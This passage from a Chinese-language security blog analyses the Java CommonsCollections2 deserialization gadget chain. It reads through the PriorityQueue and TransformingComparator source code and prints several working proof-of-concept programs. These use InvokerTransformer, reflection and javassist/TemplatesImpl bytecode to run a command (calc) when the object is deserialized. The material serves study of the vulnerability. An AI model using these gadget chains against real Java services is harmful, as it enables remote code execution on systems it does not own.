PriorityQueue&lt;Integer&gt;(<span class="hljs-keyword">new</span> Comparator&lt;Integer&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Integer o1, Integer o2)</span> </span>&#123;<br>                <span class="hljs-keyword">return</span> o2 - o1;<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">// 输出原始队列</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>        System.out.println();<br>        <span class="hljs-comment">// 逐个插入优先级队列</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            queue.add(i);<br>        &#125;<br>        <span class="hljs-comment">// 逐个输出优先级队列</span><br>        <span class="hljs-keyword">while</span> (!queue.isEmpty()) &#123;<br>            <span class="hljs-keyword">int</span> i = queue.remove();<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该比较器允许后者操作（插入或删除）的元素比前者大，所以大的元素先输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">5 7 3 6 2 8 1<br>8 7 6 5 3 2 1<br></code></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//PriorityQueue.readObject()</span><br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;<br>        s.defaultReadObject();<br>        s.readInt();<br>        queue = <span class="hljs-keyword">new</span> Object[size];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            queue[i] = s.readObject();<br>        heapify();<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDown</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-keyword">null</span>)<br>        siftDownUsingComparator(k, x);<br>    <span class="hljs-keyword">else</span><br>        siftDownComparable(k, x);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> half = size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-keyword">int</span> child = (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            Object c = queue[child];<br>            <span class="hljs-keyword">int</span> right = child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<br>                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            queue[k] = c;<br>            k = child;<br>        &#125;<br>        queue[k] = x;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>queue[i]=s.readObject();</code>那么<code>writeObject()</code>写入了对应的内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException </span>&#123;<br>        s.defaultWriteObject();<br>        s.writeInt(Math.max(<span class="hljs-number">2</span>, size + <span class="hljs-number">1</span>));<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            s.writeObject(queue[i]);<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p>从<code>readObject</code>继续往下看，在<code>siftDown()</code>中，我们需要进入<code>siftDownUsingComparator</code>(因为 cc2 中使用了<code>TransformingComparator.compare()</code>来触发，<code>comparator.compare(x, (E) c)</code>判断里的这个调用就符合了)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TransformingComparator</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Transformer&lt;? <span class="hljs-keyword">super</span> I, ? extends O&gt; transformer)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TransformingComparator</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Transformer&lt;? <span class="hljs-keyword">super</span> I, ? extends O&gt; transformer,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  <span class="hljs-keyword">final</span> Comparator&lt;O&gt; decorated)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.decorated = decorated;<br>        <span class="hljs-keyword">this</span>.transformer = transformer;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-keyword">final</span> I obj1, <span class="hljs-keyword">final</span> I obj2)</span> </span>&#123;<br>        <span class="hljs-keyword">final</span> O value1 = <span class="hljs-keyword">this</span>.transformer.transform(obj1);<br>        <span class="hljs-keyword">final</span> O value2 = <span class="hljs-keyword">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.decorated.compare(value1, value2);<br>    &#125;<br></code></pre></td></tr></table></figure><p>于是在<code>PriorityQueue queue = new PriorityQueue(1,transformingComparator);</code>传入的<code>comparator</code>就为<code>TransformingComparator</code>，调用到<code>comparator.compare(x, (E) c)</code>就能 RCE</p><p>很熟悉，这是来自于 cc1 的后半段链，而且<code>transformer</code>可控，poc 延长如下如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2Ez</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(transformingComparator);<br><span class="hljs-comment">//        PriorityQueue queue = new PriorityQueue(1,transformingComparator);</span><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先是<code>TransformingComparator</code>处理了<code>chainedTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<span class="hljs-comment">//为什么传入1，也可以传入PriorityQueue(1,transformingComparator)</span><br>queue.add(<span class="hljs-number">1</span>);<br>queue.add(<span class="hljs-number">2</span>);<span class="hljs-comment">//为什么要添加两个元素</span><br></code></pre></td></tr></table></figure><p>第一个问题，看其构造方法，最后都是<code>this</code>指向一个构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity,</span></span><br><span class="hljs-params"><span class="hljs-function">                     Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comparator)</span> </span>&#123;<br>    <span class="hljs-comment">// Note: This restriction of at least one is not actually needed,</span><br>    <span class="hljs-comment">// but continues for 1.5 compatibility</span><br>    <span class="hljs-keyword">if</span> (initialCapacity &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException();<br>    <span class="hljs-keyword">this</span>.queue = <span class="hljs-keyword">new</span> Object[initialCapacity];<br>    <span class="hljs-keyword">this</span>.comparator = comparator;<br>&#125;<br></code></pre></td></tr></table></figure><p>而我们保证一个参数不小于 1，也就是成员变量能赋到值就行，不赋值经过 this 转换后传进去<code>DEFAULT_INITIAL_CAPACITY=11</code>也大于 1</p><p>第二个问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">add</span><span class="hljs-params">(E e)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> offer(e);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">offer</span><span class="hljs-params">(E e)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (e == <span class="hljs-keyword">null</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NullPointerException();<br>        modCount++;<br>        <span class="hljs-keyword">int</span> i = size;<br>        <span class="hljs-keyword">if</span> (i &gt;= queue.length)<br>            grow(i + <span class="hljs-number">1</span>);<br>        size = i + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>            queue[<span class="hljs-number">0</span>] = e;<br>        <span class="hljs-keyword">else</span><br>            siftUp(i, e);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>add</code>两次后<code>size = i + 1;</code>，此时<code>size=2</code>，在<code>heapify#for</code>逻辑才能进去(<code>size &gt;&gt;&gt; 1 = 0</code>)；否则<code>1 &gt;&gt;&gt; 1 = 0</code></p><p>此时能够调用<code>siftDown</code>方法了，根据上面的分析，要调用<code>siftDownUsingComparator</code>，满足非空，此时传入<code>comparator</code>为<code>TransformingComparator</code>即可</p><p>但这个 poc 在编写时会触发，可以规避这个问题：不直接往<code>PriorityQueue</code>构造方法传入<code>TransformingComparator</code>，而是先让其传入其中一个构造方法——置空<code>Comparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>(DEFAULT_INITIAL_CAPACITY, <span class="hljs-keyword">null</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>(initialCapacity, <span class="hljs-keyword">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>随后 add 添加两次元素后通过反射替换<code>Comparator</code>为<code>TransformingComparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2Ez</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        Field comparator = clz.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<span class="hljs-comment">//getField无法获得</span><br>        comparator.setAccessible(<span class="hljs-keyword">true</span>);<br>        comparator.set(queue, transformingComparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>有文章提到要在 add 之后才通过反射修改 comparator 的值：add-&gt;offer-&gt;siftUp，此时要保证<code>comparator</code>的值为 null，才能添加元素，否则会出现报错，但我测试没有问题，不知道是否版本问题</p><h3 id="Gadget-1"><a href="#Gadget-1" class="headerlink" title="Gadget"></a>Gadget</h3><p>然而 cc2 用的链仍然与我们的不一致，cc2 使用的是<code>javassist</code>和<code>TemplatesImpl</code></p><p>那么现在需要将<code>TemplatesImpl.newTransformer</code>触发的方式，进一步通过<code>PriorityQueue</code>和<code>TransformingComparator.compare</code>序列化以及<code>InvokerTransformer.transform</code>执行任意代码延长</p><p>poc 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span> <span class="hljs-params">(Object o, String fieldName,Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredField = clz.getDeclaredField(fieldName);<br>            declaredField.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredField.set(o,value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br><br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetclassbytes);<br><span class="hljs-comment">//        setFieldValue(templatesimpl,&quot;_class&quot;,null);</span><br><span class="hljs-comment">//        setFieldValue(templatesimpl,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><br>        InvokerTransformer newTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(newTransformer);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br>        Object[] queue_array =<span class="hljs-keyword">new</span> Object[] &#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br><br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,queue_array);<br>        setFieldValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        setFieldValue(queue,<span class="hljs-string">&quot;comparator&quot;</span>,transformingComparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之前提到<code>_tfactory</code>和<code>_class</code>因为<code>TransformerFactoryImpl</code>置为空以及<code>TemplatesImpl</code>会赋值<code>_class</code>，这里 poc 却不需要再设置其值，因为在触发到<code>TemplateImpl.newTransformer.TransformerImpl</code>会设置<code>_tfactory</code>值为<code>TransformerFactoryImpl _tfactory = null</code>，<code>_class</code>值则是<code>_class = new Class[classCount]=new 